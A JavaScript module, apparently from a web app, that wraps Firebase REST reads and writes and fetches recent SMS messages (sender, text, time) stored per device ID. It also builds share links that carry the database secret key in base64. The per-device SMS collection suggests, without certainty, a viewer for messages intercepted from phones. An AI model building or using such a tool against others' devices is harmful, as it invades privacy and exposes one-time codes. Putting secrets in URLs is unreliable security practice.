import { extractMessages } from './smsParser'

const STORAGE_KEY = 'flixy_accounts';

export function loadAccounts() {
  try {
    const data = localStorage.getItem(STORAGE_KEY);
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

export function saveAccounts(accounts) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(accounts));
}

export async function firebaseGet(url, auth, path, params = {}) {
  let cleanUrl = url.trim().replace(/\/$/, '');
  if (!cleanUrl.startsWith('http')) cleanUrl = 'https://' + cleanUrl;
  if (!cleanUrl.includes('firebaseio.com') && !cleanUrl.includes('firebasedatabase.app')) {
    throw new Error('Invalid Firebase URL. Must contain firebaseio.com or firebasedatabase.app');
  }
  const searchParams = new URLSearchParams({ auth: auth.trim(), ...params });
  const fullUrl = `${cleanUrl}/${path}.json?${searchParams}`;
  let res;
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 15000);
    res = await fetch(fullUrl, {
      method: 'GET',
      headers: { Accept: 'application/json' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
  } catch (netErr) {
    if (netErr.name === 'AbortError') throw new Error('Request timed out. Check your Firebase URL.');
    throw new Error('Network error: ' + netErr.message);
  }
  if (!res.ok) {
    const text = await res.text().catch(() => '');
    let msg;
    if (res.status === 401 || res.status === 403) {
      msg = 'PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key.';
    } else if (res.status === 404) {
      return null;
    } else {
      msg = `HTTP ${res.status}: ${text.slice(0, 300)}`;
    }
    throw new Error(msg);
  }
  return res.json();
}

export async function firebasePut(url, auth, path, data) {
  const cleanUrl = url.replace(/\/$/, '');
  const res = await fetch(`${cleanUrl}/${path}.json?auth=${auth}`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  if (!res.ok) {
    throw res.status === 401 || res.status === 403
      ? new Error('PERMISSION_DENIED: Cannot write to Firebase.')
      : new Error(`HTTP ${res.status}`);
  }
  return res.json();
}

export async function firebaseDelete(url, auth, path) {
  const cleanUrl = url.replace(/\/$/, '');
  const res = await fetch(`${cleanUrl}/${path}.json?auth=${auth}`, {
    method: 'DELETE'
  });
  if (!res.ok && res.status === 403) throw new Error('PERMISSION_DENIED');
}

export function generateShareLink(url, key) {
  const base = window.location.origin + window.location.pathname;
  const encoded = btoa(unescape(encodeURIComponent(url + '|||' + key)));
  return `${base}?s=${encoded}`;
}

export function decodeShareLink(encoded) {
  try {
    const decoded = decodeURIComponent(escape(atob(encoded)));
    const [url, key] = decoded.split('|||');
    if (url && key) return { url, key };
  } catch {}
  return null;
}

export async function analyticsLog(message, file) {}

export function extractProfexMessages(data) {
  // profex_incoming/<deviceId>/<smsId> = { rawTs, sender, text, time }
  const msgs = [];
  if (!data || typeof data !== 'object') return msgs;
  const entries = Object.entries(data);
  const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
  for (const [, msg] of slice) {
    if (!msg || typeof msg !== 'object') continue;
    const text = String(msg.text || msg.message || msg.body || '');
    if (text.trim()) {
      msgs.push({
        text,
        sender: String(msg.sender || msg.from || 'Unknown'),
        time: String(msg.time || msg.dateTime || msg.date || '')
      });
    }
  }
  return msgs.reverse();
}

export async function loadDeviceMessages(url, auth, deviceId) {
  const [legacy, profex] = await Promise.all([
    firebaseGet(url, auth, `messages/${deviceId}`, { orderBy: '"$key"', limitToLast: '150' }),
    firebaseGet(url, auth, `profex_incoming/${deviceId}`, { orderBy: '"$key"', limitToLast: '150' })
  ]);
  const msgs = [...extractMessages(legacy), ...extractProfexMessages(profex)];
  const seen = new Set();
  return msgs.filter(m => {
    const k = `${m.text}|${m.sender}|${m.time}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
}
